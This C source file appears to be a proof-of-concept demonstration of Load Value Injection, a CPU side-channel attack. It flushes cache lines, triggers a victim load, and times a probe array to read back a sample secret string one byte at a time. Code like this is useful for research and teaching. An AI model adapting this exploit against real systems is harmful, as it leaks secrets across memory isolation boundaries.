#include <emmintrin.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../cache.h"

/// The buf_size is used in the victim function so it has to be a variable and
/// not a constant. So it can be evicted from the cache and won't be hardcoded
/// in asm
char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED;
char *secret = "The answer is 42";
char *arg_copy CACHE_LINE_ALIGNED;
char **trusted_ptr CACHE_LINE_ALIGNED;

volatile char tmp = 0;

void noinline victim_function(size_t x) {
  *arg_copy = x;
  tmp = probe[**trusted_ptr * CACHE_LINE_SIZE];
}

size_t lvi(size_t x_to_read) {
  size_t results[256] = {0};

  for (size_t try = 999; try > 0; try--) {

    _mm_clflush(trusted_ptr);
    _mm_clflush(*trusted_ptr);
    _mm_clflush(arg_copy);
    /// Flush the probe array from the cache
    for (size_t i = 0; i < 256; i++) {
      _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
    }

    victim_function(x_to_read);

    measure_cache(probe, results);
    int read = valid_read(results, 256);
    if (read != -1) {
      return read;
    }
  }

  return 0;
}

int main() {
  trusted_ptr = malloc(sizeof(trusted_ptr));
  *trusted_ptr = malloc(sizeof(*trusted_ptr));
  arg_copy = malloc(sizeof(arg_copy));

  size_t secret_offset = (size_t)secret;
  int len = strlen(secret);

  /// Write probe to RAM and put it in non COW pages
  for (int i = 0; i < sizeof(probe); i++) {
    probe[i] = 1;
  }

  for (int i = 0; i < len; i++) {
    printf("reading %d...", i);
    char value = lvi(secret_offset + i);
    printf("0x%02X='%c'\n", value, (value > 31 && value < 127 ? value : '?'));
  }
  printf("\n");

  free(*trusted_ptr);
  free(trusted_ptr);
  free(arg_copy);
  return 0;
}
